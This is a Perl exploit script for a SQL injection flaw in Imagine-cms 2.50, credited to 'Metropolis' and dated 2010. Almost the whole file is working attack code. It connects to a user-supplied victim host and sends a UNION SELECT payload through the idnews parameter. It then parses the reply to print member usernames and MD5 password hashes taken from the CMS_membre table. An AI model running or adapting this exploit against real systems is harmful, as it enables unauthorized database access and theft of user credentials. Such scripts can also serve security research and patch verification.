#!/usr/bin/perl
###########################################
#
# Script Name : Imagine-cms 2.50
#
# Version :  2.50
# 
# Bug Type : SQL Injection
#
# Found by : Metropolis 
# 
# Home : http://metropolis.fr.cr
#
# Discovered : 21/07/2010
#
# Download app : 
# http://www.imagine-cms.net/modules/
# telechargement/index.php?page=afficher_souscat&id_cat=2
# 
###########################################
use IO::Socket;
if(@ARGV != 2) { usage(); }
else { exploit(); }
sub header()
{
  print "\n- Author: Metropolis\r\n";
  print "- Imagine-cms <= 2.50 Remote SQL Injection Exploit\r\n";
}
sub usage()
{
  header();
  print "- Usage: $0 <host> <path>\r\n";
  print "- <host> -> Victim's host ex: www.victim.com\r\n";
  print "- <path> -> ex: /\r\n";
  exit();
}
sub exploit ()
{
  #Our variables...
  $spserver = $ARGV[0];
  $spserver =~ s/(http:\/\/)//eg;
  $sphost   = "http://".$spserver;
  $spdir    = $ARGV[1];
  $spport   = "80";
  $sptar    = "index.php?page=commentaire&idnews=";
  $spxp     = "-1+and+1=0+union+select+1,2,concat(25552,membre_pseudo,25553,membre_mdp,25554),4,5+from+CMS_membre--";
  $spreq    = $sphost.$spdir.$sptar.$spxp;
  #Sending data...
  header();
  print "- Trying to connect: $spserver\r\n";
  $sp = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$spserver", PeerPort => "$spport") || die "- Connection failed...\n";
  print $sp "GET $spreq HTTP/1.1\n";
  print $sp "Accept: */*\n";
  print $sp "Referer: $sphost\n";
  print $sp "Accept-Language: tr\n";
  print $sp "User-Agent: NukeZilla\n";
  print $sp "Cache-Control: no-cache\n";
  print $sp "Host: $spserver\n";
  print $sp "Connection: close\n\n";
  print "- Connected...\r\n";
  while ($answer = <$sp>) {
    if ($answer =~ /25552(.*?)25553([\d,a-f]{32})25554/) {
      print "- Exploit succeed!\r\n";
      print "- Username: $1\r\n";
      print "- MD5 HASH of PASSWORD: $2\r\n";
      exit();
    }
  }
  #Exploit failed...
  print "- Exploit failed\n"
}